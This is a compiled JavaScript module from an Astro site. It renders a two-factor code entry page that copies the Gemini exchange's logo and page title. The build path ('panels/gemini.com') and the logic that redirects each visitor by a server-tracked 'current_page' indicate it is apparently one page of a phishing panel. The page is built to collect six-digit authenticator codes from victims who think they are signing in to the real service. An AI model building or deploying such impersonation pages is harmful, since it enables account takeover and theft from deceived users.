import { c as createComponent, a as createAstro, d as renderComponent, r as renderTemplate, m as maybeRenderHead } from '../../chunks/astro/server_MzpsRm1w.mjs';
import 'kleur/colors';
import { $ as $$AuthLayout } from '../../chunks/AuthLayout_CigA1UqO.mjs';
import { i as initializeDb, g as getUserByEmail } from '../../chunks/db__92qgssi.mjs';
/* empty css                                  */
export { renderers } from '../../renderers.mjs';

const $$Astro = createAstro();
const $$2Fa = createComponent(async ($$result, $$props, $$slots) => {
  const Astro2 = $$result.createAstro($$Astro, $$props, $$slots);
  Astro2.self = $$2Fa;
  initializeDb();
  const cookieHeader = Astro2.request.headers.get("cookie");
  const encodedEmail = cookieHeader?.match(/user_email=([^;]+)/)?.[1];
  const userEmail = encodedEmail ? decodeURIComponent(encodedEmail) : null;
  if (!userEmail) {
    return Astro2.redirect("/signin");
  }
  const user = await getUserByEmail(userEmail);
  if (!user) {
    return Astro2.redirect("/signin");
  }
  if (user.current_page && user.current_page !== "2fa") {
    return Astro2.redirect(`/${user.current_page}`);
  }
  return renderTemplate`${renderComponent($$result, "AuthLayout", $$AuthLayout, { "title": "Gemini - Enter Your 2-Factor Code", "data-astro-cid-upwhqgsb": true }, { "default": async ($$result2) => renderTemplate` ${maybeRenderHead()}<div class="ev4buvj6 css-1ia2q6l e1vsinnk0" data-astro-cid-upwhqgsb> <div class="css-z1oayz e1vsinnk0" data-astro-cid-upwhqgsb> <svg id="gemini-logo-cyan_svg__Layer_1" data-name="Layer 1" viewBox="0 0 129.33 128.94" class="css-cp4eka ev4buvj8" data-astro-cid-upwhqgsb><path d="M83.86 2a43.53 43.53 0 00-43 38.64 43.26 43.26 0 004.63 86.28 43.53 43.53 0 0043-38.64A43.26 43.26 0 0083.86 2zM117 50.17a33.7 33.7 0 01-28.25 28.24V50.17zM12.35 78.77a33.69 33.69 0 0128.24-28.23v28.23zm66.25 9.78a33.48 33.48 0 01-66.25 0zm.4-38.38v28.6H50.37v-28.6zm38-9.78H50.73a33.48 33.48 0 0166.25 0z" fill="#26ddf9" data-astro-cid-upwhqgsb></path></svg> </div> </div><div class="css-p17jcv ev4buvj3" data-astro-cid-upwhqgsb> <a type="button" role="button" aria-label="Back to login" class="e1fsl8uw0 css-15vjxl7 e1czpx482" data-astro-cid-upwhqgsb><svg aria-hidden="true" width="24px" height="24px" viewBox="0 0 24 24" fill="currentcolor" xmlns="http://www.w3.org/2000/svg" data-astro-cid-upwhqgsb><path fill-rule="evenodd" clip-rule="evenodd" d="M8.41424 12.0001L15.7071 4.70718L14.2929 3.29297L5.58582 12.0001L14.2929 20.7072L15.7071 19.293L8.41424 12.0001Z" data-astro-cid-upwhqgsb></path></svg></a> </div><div class="css-1x5wxe3 ev4buvj12" data-astro-cid-upwhqgsb> <div class="css-xhgaf9 ev4buvj11" data-astro-cid-upwhqgsb> <div class="css-k2k4ev ev4buvj10" data-astro-cid-upwhqgsb> <div class="css-2sm8t6 e1vsinnk0" data-astro-cid-upwhqgsb> <h2 data-testid="title" class="css-1ursixa eboofq0" data-astro-cid-upwhqgsb></h2> </div><div class="css-147gpdq e1vsinnk0" data-astro-cid-upwhqgsb> <h2 data-testid="two-factor-auth-title" class="css-1uz10xt eboofq0" data-astro-cid-upwhqgsb>
Enter the code from the authenticator app
</h2><p data-testid="two-factor-auth" class="css-8s8x64 ez8rcrm1" data-astro-cid-upwhqgsb></p><form class="css-1a9w5bx etq1frq1" data-astro-cid-upwhqgsb> <div class="css-50bg6q" data-astro-cid-upwhqgsb> <div class="css-9nghkz" data-astro-cid-upwhqgsb> <input type="tel" inputmode="numeric" pattern="[0-9]{1}" min="0" max="9" maxlength="1" class="authy-code css-k9o5qk" autocomplete="one-time-code" aria-label="Input Token. Character 1." data-testid="authy-code-1" id="code-1" data-astro-cid-upwhqgsb><input type="tel" inputmode="numeric" pattern="[0-9]{1}" min="0" max="9" maxlength="1" class="authy-code css-k9o5qk" autocomplete="off" aria-label="Input Token. Character 2." data-testid="authy-code-2" id="code-2" data-astro-cid-upwhqgsb><input type="tel" inputmode="numeric" pattern="[0-9]{1}" min="0" max="9" maxlength="1" class="authy-code css-k9o5qk" autocomplete="off" aria-label="Input Token. Character 3." data-testid="authy-code-3" id="code-3" data-astro-cid-upwhqgsb><input type="tel" inputmode="numeric" pattern="[0-9]{1}" min="0" max="9" maxlength="1" class="authy-code css-k9o5qk" autocomplete="off" aria-label="Input Token. Character 4." data-testid="authy-code-4" id="code-4" data-astro-cid-upwhqgsb><input type="tel" inputmode="numeric" pattern="[0-9]{1}" min="0" max="9" maxlength="1" class="authy-code css-k9o5qk" autocomplete="off" aria-label="Input Token. Character 5." data-testid="authy-code-5" id="code-5" data-astro-cid-upwhqgsb><input type="tel" inputmode="numeric" pattern="[0-9]{1}" min="0" max="9" maxlength="1" class="authy-code css-k9o5qk" autocomplete="off" aria-label="Input Token. Character 6." data-testid="authy-code-6" id="code-6" data-astro-cid-upwhqgsb> </div> </div><div data-astro-cid-upwhqgsb> <label data-testid="undefined-label" class="css-12rv8da ettursl0" data-astro-cid-upwhqgsb><div class="css-ywctyo e9wwanr0" data-astro-cid-upwhqgsb> <input name="remember" type="checkbox" class="css-gjd6wr e1jjtgfp0" checked data-astro-cid-upwhqgsb><svg aria-hidden="true" width="20px" height="20px" viewBox="0 0 24 24" fill="#010304" xmlns="http://www.w3.org/2000/svg" class="selected" data-astro-cid-upwhqgsb><path fill-rule="evenodd" clip-rule="evenodd" d="M5 2C3.34315 2 2 3.34315 2 5V19C2 20.6569 3.34315 22 5 22H19C20.6569 22 22 20.6569 22 19V5C22 3.34315 20.6569 2 19 2H5ZM11.2071 16.2071L17.7071 9.70711L16.2929 8.29289L10.5 14.0858L7.20711 10.7929L5.79289 12.2071L9.79289 16.2071L10.5 16.9142L11.2071 16.2071Z" data-astro-cid-upwhqgsb></path></svg><svg aria-hidden="true" width="20px" height="20px" viewBox="0 0 24 24" fill="#010304" xmlns="http://www.w3.org/2000/svg" class="unselected" data-astro-cid-upwhqgsb><path fill-rule="evenodd" clip-rule="evenodd" d="M2 5C2 3.34315 3.34315 2 5 2H19C20.6569 2 22 3.34315 22 5V19C22 20.6569 20.6569 22 19 22H5C3.34315 22 2 20.6569 2 19V5ZM5 4C4.44772 4 4 4.44772 4 5V19C4 19.5523 4.44772 20 5 20H19C19.5523 20 20 19.5523 20 19V5C20 4.44772 19.5523 4 19 4H5Z" data-astro-cid-upwhqgsb></path></svg> </div><div class="css-17hv65w e9wwanr0" data-astro-cid-upwhqgsb>
Remember this device for 24 hours
</div></label> </div> </form> </div> </div> </div> </div> ` })}  `;
}, "C:/Users/coold/Desktop/panels/gemini.com/src/pages/signin/2fa.astro", void 0);

const $$file = "C:/Users/coold/Desktop/panels/gemini.com/src/pages/signin/2fa.astro";
const $$url = "/signin/2fa";

const _page = /*#__PURE__*/Object.freeze(/*#__PURE__*/Object.defineProperty({
    __proto__: null,
    default: $$2Fa,
    file: $$file,
    url: $$url
}, Symbol.toStringTag, { value: 'Module' }));

const page = () => _page;

export { page };
